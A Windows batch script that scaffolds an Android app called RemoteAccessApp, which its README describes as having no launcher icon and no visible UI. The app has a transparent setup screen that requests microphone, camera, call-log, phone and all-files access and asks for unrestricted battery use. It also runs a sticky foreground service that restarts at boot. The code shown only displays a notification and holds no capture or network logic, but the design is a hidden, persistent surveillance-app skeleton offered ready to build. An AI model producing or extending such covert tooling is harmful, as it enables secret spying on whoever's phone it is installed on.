@echo off
setlocal enabledelayedexpansion

REM === Root folder ===
set APP=RemoteAccessApp
mkdir "%APP%"
mkdir "%APP%\gradle\wrapper"
mkdir "%APP%\keystore"
mkdir "%APP%\app\src\main\java\com\remoteaccess"
mkdir "%APP%\app\src\main\res\values"
mkdir "%APP%\app\src\main\res\xml"
mkdir "%APP%\app\src\main\res\layout"
mkdir "%APP%\app\scripts"

REM ---------- settings.gradle (Groovy) ----------
> "%APP%\settings.gradle" echo rootProject.name = 'RemoteAccessApp'
>> "%APP%\settings.gradle" echo include ':app'

REM ---------- build.gradle (root) ----------
> "%APP%\build.gradle" echo buildscript {
>> "%APP%\build.gradle" echo^    repositories { google(); mavenCentral() }
>> "%APP%\build.gradle" echo^    dependencies { classpath 'com.android.tools.build:gradle:8.5.0' }
>> "%APP%\build.gradle" echo }
>> "%APP%\build.gradle" echo allprojects { repositories { google(); mavenCentral() } }
>> "%APP%\build.gradle" echo task clean(type: Delete) { delete rootProject.buildDir }

REM ---------- gradle.properties (optional sane defaults) ----------
> "%APP%\gradle.properties" echo org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
>> "%APP%\gradle.properties" echo android.useAndroidX=true
>> "%APP%\gradle.properties" echo android.nonTransitiveRClass=true

REM ---------- app/build.gradle (Java only; no Kotlin needed) ----------
> "%APP%\app\build.gradle" echo apply plugin: 'com.android.application'
>> "%APP%\app\build.gradle" echo
>> "%APP%\app\build.gradle" echo android {
>> "%APP%\app\build.gradle" echo^    namespace 'com.remoteaccess'
>> "%APP%\app\build.gradle" echo^    compileSdkVersion 34
>> "%APP%\app\build.gradle" echo
>> "%APP%\app\build.gradle" echo^    defaultConfig {
>> "%APP%\app\build.gradle" echo^        applicationId 'com.remoteaccess'
>> "%APP%\app\build.gradle" echo^        minSdkVersion 24
>> "%APP%\app\build.gradle" echo^        targetSdkVersion 34
>> "%APP%\app\build.gradle" echo^        versionCode 1
>> "%APP%\app\build.gradle" echo^        versionName '0.1.0'
>> "%APP%\app\build.gradle" echo^    }
>> "%APP%\app\build.gradle" echo
>> "%APP%\app\build.gradle" echo^    buildTypes {
>> "%APP%\app\build.gradle" echo^        debug { debuggable true }
>> "%APP%\app\build.gradle" echo^        release {
>> "%APP%\app\build.gradle" echo^            minifyEnabled false
>> "%APP%\app\build.gradle" echo^            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
>> "%APP%\app\build.gradle" echo^        }
>> "%APP%\app\build.gradle" echo^    }
>> "%APP%\app\build.gradle" echo
>> "%APP%\app\build.gradle" echo^    compileOptions {
>> "%APP%\app\build.gradle" echo^        sourceCompatibility JavaVersion.VERSION_11
>> "%APP%\app\build.gradle" echo^        targetCompatibility JavaVersion.VERSION_11
>> "%APP%\app\build.gradle" echo^    }
>> "%APP%\app\build.gradle" echo }
>> "%APP%\app\build.gradle" echo
>> "%APP%\app\build.gradle" echo dependencies {
>> "%APP%\app\build.gradle" echo^    implementation 'androidx.core:core-ktx:1.13.1'
>> "%APP%\app\build.gradle" echo^    implementation 'com.google.android.material:material:1.12.0'
>> "%APP%\app\build.gradle" echo }

REM ---------- proguard ----------
> "%APP%\app\proguard-rules.pro" echo # keep rules go here later

REM ---------- AndroidManifest.xml (NO LAUNCHER ICON) ----------
> "%APP%\app\src\main\AndroidManifest.xml" echo ^<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.remoteaccess"^>
>> "%APP%\app\src\main\AndroidManifest.xml" echo   ^<uses-permission android:name="android.permission.INTERNET"/^>
>> "%APP%\app\src\main\AndroidManifest.xml" echo   ^<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/^>
>> "%APP%\app\src\main\AndroidManifest.xml" echo   ^<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/^>
>> "%APP%\app\src\main\AndroidManifest.xml" echo   ^<uses-permission android:name="android.permission.RECORD_AUDIO"/^>
>> "%APP%\app\src\main\AndroidManifest.xml" echo   ^<uses-permission android:name="android.permission.CAMERA"/^>
>> "%APP%\app\src\main\AndroidManifest.xml" echo   ^<uses-permission android:name="android.permission.CALL_PHONE"/^>
>> "%APP%\app\src\main\AndroidManifest.xml" echo   ^<uses-permission android:name="android.permission.READ_CALL_LOG"/^>
>> "%APP%\app\src\main\AndroidManifest.xml" echo   ^<uses-permission android:name="android.permission.POST_NOTIFICATIONS"/^>
>> "%APP%\app\src\main\AndroidManifest.xml" echo   ^<!-- All Files Access (Android 11+) shown via Settings page -->^>
>> "%APP%\app\src\main\AndroidManifest.xml" echo   ^<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/^>
>> "%APP%\app\src\main\AndroidManifest.xml" echo
>> "%APP%\app\src\main\AndroidManifest.xml" echo   ^<application
>> "%APP%\app\src\main\AndroidManifest.xml" echo       android:allowBackup="false"
>> "%APP%\app\src\main\AndroidManifest.xml" echo       android:label="RemoteAccessApp"
>> "%APP%\app\src\main\AndroidManifest.xml" echo       android:usesCleartextTraffic="false"
>> "%APP%\app\src\main\AndroidManifest.xml" echo       android:networkSecurityConfig="@xml/network_security_config"^>
>> "%APP%\app\src\main\AndroidManifest.xml" echo
>> "%APP%\app\src\main\AndroidManifest.xml" echo       ^<!-- Transparent activity, NO LAUNCHER intent filter -->^>
>> "%APP%\app\src\main\AndroidManifest.xml" echo       ^<activity
>> "%APP%\app\src\main\AndroidManifest.xml" echo           android:name="com.remoteaccess.SetupActivity"
>> "%APP%\app\src\main\AndroidManifest.xml" echo           android:exported="true"
>> "%APP%\app\src\main\AndroidManifest.xml" echo           android:theme="@style/Theme.Transparent" /^>
>> "%APP%\app\src\main\AndroidManifest.xml" echo
>> "%APP%\app\src\main\AndroidManifest.xml" echo       ^<service
>> "%APP%\app\src\main\AndroidManifest.xml" echo           android:name="com.remoteaccess.RemoteService"
>> "%APP%\app\src\main\AndroidManifest.xml" echo           android:enabled="true"
>> "%APP%\app\src\main\AndroidManifest.xml" echo           android:exported="false"
>> "%APP%\app\src\main\AndroidManifest.xml" echo           android:foregroundServiceType="dataSync|microphone|camera" /^>
>> "%APP%\app\src\main\AndroidManifest.xml" echo
>> "%APP%\app\src\main\AndroidManifest.xml" echo       ^<receiver
>> "%APP%\app\src\main\AndroidManifest.xml" echo           android:name="com.remoteaccess.BootReceiver"
>> "%APP%\app\src\main\AndroidManifest.xml" echo           android:enabled="true"
>> "%APP%\app\src\main\AndroidManifest.xml" echo           android:exported="true"^>
>> "%APP%\app\src\main\AndroidManifest.xml" echo           ^<intent-filter^>
>> "%APP%\app\src\main\AndroidManifest.xml" echo               ^<action android:name="android.intent.action.BOOT_COMPLETED"/^>
>> "%APP%\app\src\main\AndroidManifest.xml" echo               ^<action android:name="android.intent.action.LOCKED_BOOT_COMPLETED"/^>
>> "%APP%\app\src\main\AndroidManifest.xml" echo           ^</intent-filter^>
>> "%APP%\app\src\main\AndroidManifest.xml" echo       ^</receiver^>
>> "%APP%\app\src\main\AndroidManifest.xml" echo
>> "%APP%\app\src\main\AndroidManifest.xml" echo   ^</application^>
>> "%APP%\app\src\main\AndroidManifest.xml" echo ^</manifest^>

REM ---------- styles.xml (transparent theme) ----------
> "%APP%\app\src\main\res\values\styles.xml" echo ^<resources^>
>> "%APP%\app\src\main\res\values\styles.xml" echo   ^<style name="Theme.Transparent" parent="Theme.MaterialComponents.DayNight.NoActionBar"^>
>> "%APP%\app\src\main\res\values\styles.xml" echo     ^<item name="android:windowIsTranslucent"^>true^</item^>
>> "%APP%\app\src\main\res\values\styles.xml" echo     ^<item name="android:windowBackground"^>@android:color/transparent^</item^>
>> "%APP%\app\src\main\res\values\styles.xml" echo     ^<item name="android:windowNoTitle"^>true^</item^>
>> "%APP%\app\src\main\res\values\styles.xml" echo     ^<item name="android:backgroundDimEnabled"^>false^</item^>
>> "%APP%\app\src\main\res\values\styles.xml" echo   ^</style^>
>> "%APP%\app\src\main\res\values\styles.xml" echo ^</resources^>

REM ---------- strings.xml ----------
> "%APP%\app\src\main\res\values\strings.xml" echo ^<resources^>
>> "%APP%\app\src\main\res\values\strings.xml" echo   ^<string name="app_name"^>RemoteAccessApp^</string^>
>> "%APP%\app\src\main\res\values\strings.xml" echo ^</resources^>

REM ---------- network_security_config.xml ----------
> "%APP%\app\src\main\res\xml\network_security_config.xml" echo ^<network-security-config^>
>> "%APP%\app\src\main\res\xml\network_security_config.xml" echo   ^<base-config cleartextTrafficPermitted="false" /^>
>> "%APP%\app\src\main\res\xml\network_security_config.xml" echo ^</network-security-config^>

REM ---------- Java sources (minimal, compilable) ----------
REM SetupActivity: requests perms + opens Settings for All Files & Battery Unrestricted; starts service then finish
> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo package com.remoteaccess;
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo import android.app.Activity;
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo import android.content.Intent;
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo import android.net.Uri;
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo import android.os.Build;
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo import android.os.Bundle;
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo import android.provider.Settings;
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo import androidx.annotation.Nullable;
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo import androidx.core.app.ActivityCompat;
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo public class SetupActivity extends Activity {
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo   @Override protected void onCreate(@Nullable Bundle savedInstanceState) {
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo     super.onCreate(savedInstanceState);
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo     String[] perms = new String[] {
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo       android.Manifest.permission.RECORD_AUDIO,
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo       android.Manifest.permission.CAMERA,
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo       android.Manifest.permission.CALL_PHONE,
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo       android.Manifest.permission.READ_CALL_LOG
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo     };
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo     if (Build.VERSION.SDK_INT ^>= 33) {
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo       perms = new String[] {
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo         android.Manifest.permission.POST_NOTIFICATIONS,
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo         android.Manifest.permission.RECORD_AUDIO,
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo         android.Manifest.permission.CAMERA,
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo         android.Manifest.permission.CALL_PHONE,
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo         android.Manifest.permission.READ_CALL_LOG
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo       };
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo     }
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo     ActivityCompat.requestPermissions(this, perms, 1001);
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo     try {
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo       if (Build.VERSION.SDK_INT ^>= 30) {
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo         Intent allFiles = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo         allFiles.setData(Uri.parse("package:" + getPackageName()));
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo         startActivity(allFiles);
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo       }
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo       if (Build.VERSION.SDK_INT ^>= 23) {
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo         Intent battery = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo         battery.setData(Uri.parse("package:" + getPackageName()));
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo         startActivity(battery);
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo       }
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo     } catch (Throwable t) { }
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo     Intent svc = new Intent(this, RemoteService.class);
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo     if (Build.VERSION.SDK_INT ^>= 26) startForegroundService(svc); else startService(svc);
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo     finish();
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo   }
>> "%APP%\app\src\main\java\com\remoteaccess\SetupActivity.java" echo }

REM RemoteService: startForeground with a persistent notification
> "%APP%\app\src\main\java\com\remoteaccess\RemoteService.java" echo package com.remoteaccess;
>> "%APP%\app\src\main\java\com\remoteaccess\RemoteService.java" echo import android.app.*;
>> "%APP%\app\src\main\java\com\remoteaccess\RemoteService.java" echo import android.content.*;
>> "%APP%\app\src\main\java\com\remoteaccess\RemoteService.java" echo import android.os.*;
>> "%APP%\app\src\main\java\com\remoteaccess\RemoteService.java" echo import androidx.core.app.NotificationCompat;
>> "%APP%\app\src\main\java\com\remoteaccess\RemoteService.java" echo public class RemoteService extends Service {
>> "%APP%\app\src\main\java\com\remoteaccess\RemoteService.java" echo   private static final String CH="remote_access_chan";
>> "%APP%\app\src\main\java\com\remoteaccess\RemoteService.java" echo   @Override public void onCreate() {
>> "%APP%\app\src\main\java\com\remoteaccess\RemoteService.java" echo     super.onCreate();
>> "%APP%\app\src\main\java\com\remoteaccess\RemoteService.java" echo     if (Build.VERSION.SDK_INT ^>= 26) {
>> "%APP%\app\src\main\java\com\remoteaccess\RemoteService.java" echo       NotificationChannel c=new NotificationChannel(CH,"RemoteAccess", NotificationManager.IMPORTANCE_LOW);
>> "%APP%\app\src\main\java\com\remoteaccess\RemoteService.java" echo       NotificationManager nm=(NotificationManager)getSystemService(NOTIFICATION_SERVICE);
>> "%APP%\app\src\main\java\com\remoteaccess\RemoteService.java" echo       nm.createNotificationChannel(c);
>> "%APP%\app\src\main\java\com\remoteaccess\RemoteService.java" echo     }
>> "%APP%\app\src\main\java\com\remoteaccess\RemoteService.java" echo   }
>> "%APP%\app\src\main\java\com\remoteaccess\RemoteService.java" echo   @Override public int onStartCommand(Intent i, int f, int id) {
>> "%APP%\app\src\main\java\com\remoteaccess\RemoteService.java" echo     Notification n=new NotificationCompat.Builder(this, CH)
>> "%APP%\app\src\main\java\com\remoteaccess\RemoteService.java" echo       .setContentTitle("RemoteAccess is active")
>> "%APP%\app\src\main\java\com\remoteaccess\RemoteService.java" echo       .setContentText("Running as a foreground service")
>> "%APP%\app\src\main\java\com\remoteaccess\RemoteService.java" echo       .setSmallIcon(android.R.drawable.stat_sys_download_done)
>> "%APP%\app\src\main\java\com\remoteaccess\RemoteService.java" echo       .setOngoing(true).build();
>> "%APP%\app\src\main\java\com\remoteaccess\RemoteService.java" echo     startForeground(1, n);
>> "%APP%\app\src\main\java\com\remoteaccess\RemoteService.java" echo     return START_STICKY;
>> "%APP%\app\src\main\java\com\remoteaccess\RemoteService.java" echo   }
>> "%APP%\app\src\main\java\com\remoteaccess\RemoteService.java" echo   @Override public IBinder onBind(Intent i){ return null; }
>> "%APP%\app\src\main\java\com\remoteaccess\RemoteService.java" echo }

REM BootReceiver: start service on boot
> "%APP%\app\src\main\java\com\remoteaccess\BootReceiver.java" echo package com.remoteaccess;
>> "%APP%\app\src\main\java\com\remoteaccess\BootReceiver.java" echo import android.content.*;
>> "%APP%\app\src\main\java\com\remoteaccess\BootReceiver.java" echo import android.os.Build;
>> "%APP%\app\src\main\java\com\remoteaccess\BootReceiver.java" echo public class BootReceiver extends BroadcastReceiver {
>> "%APP%\app\src\main\java\com\remoteaccess\BootReceiver.java" echo   @Override public void onReceive(Context c, Intent i){
>> "%APP%\app\src\main\java\com\remoteaccess\BootReceiver.java" echo     Intent svc=new Intent(c, RemoteService.class);
>> "%APP%\app\src\main\java\com\remoteaccess\BootReceiver.java" echo     if (Build.VERSION.SDK_INT ^>= 26) c.startForegroundService(svc); else c.startService(svc);
>> "%APP%\app\src\main\java\com\remoteaccess\BootReceiver.java" echo   }
>> "%APP%\app\src\main\java\com\remoteaccess\BootReceiver.java" echo }

REM ---------- helper .bat scripts ----------
> "%APP%\app\scripts\build-debug.bat" echo @echo off
>> "%APP%\app\scripts\build-debug.bat" echo cd /d %%~dp0\..\..
>> "%APP%\app\scripts\build-debug.bat" echo .\gradlew clean :app:assembleDebug

> "%APP%\app\scripts\install-debug.bat" echo @echo off
>> "%APP%\app\scripts\install-debug.bat" echo cd /d %%~dp0\..\..
>> "%APP%\app\scripts\install-debug.bat" echo adb install -r app\build\outputs\apk\debug\app-debug.apk

> "%APP%\app\scripts\start-setup.bat" echo @echo off
>> "%APP%\app\scripts\start-setup.bat" echo adb shell am start -n com.remoteaccess/.SetupActivity

> "%APP%\README.md" echo # RemoteAccessApp (CLI-only, no launcher icon, no visible UI)
>> "%APP%\README.md" echo
>> "%APP%\README.md" echo ## Build and install (Windows CMD)
>> "%APP%\README.md" echo 1. Install Java 11+ and Gradle on PATH.
>> "%APP%\README.md" echo 2. In ^`RemoteAccessApp^`, run: ^`gradle wrapper^`
>> "%APP%\README.md" echo 3. Build: ^`.\gradlew clean :app:assembleDebug^`
>> "%APP%\README.md" echo 4. Install: ^`app\scripts\install-debug.bat^`
>> "%APP%\README.md" echo 5. First run (no icon): ^`app\scripts\start-setup.bat^`
>> "%APP%\README.md" echo
>> "%APP%\README.md" echo On first run, approve: Notifications (Android 13+), Mic, Camera, Phone, Call Log.
>> "%APP%\README.md" echo Then Settings will open for: All Files Access (Android 11+) and Battery ^"Unrestricted^".
>> "%APP%\README.md" echo The service starts foreground with a persistent notification.

echo ✅ Scaffolded %APP%
echo.
echo NEXT:
echo   1) cd %APP%
echo   2) gradle wrapper
echo   3) .\gradlew clean :app:assembleDebug
echo   4) adb install -r app\build\outputs\apk\debug\app-debug.apk
echo   5) app\scripts\start-setup.bat   (approve prompts)
echo.

endlocal
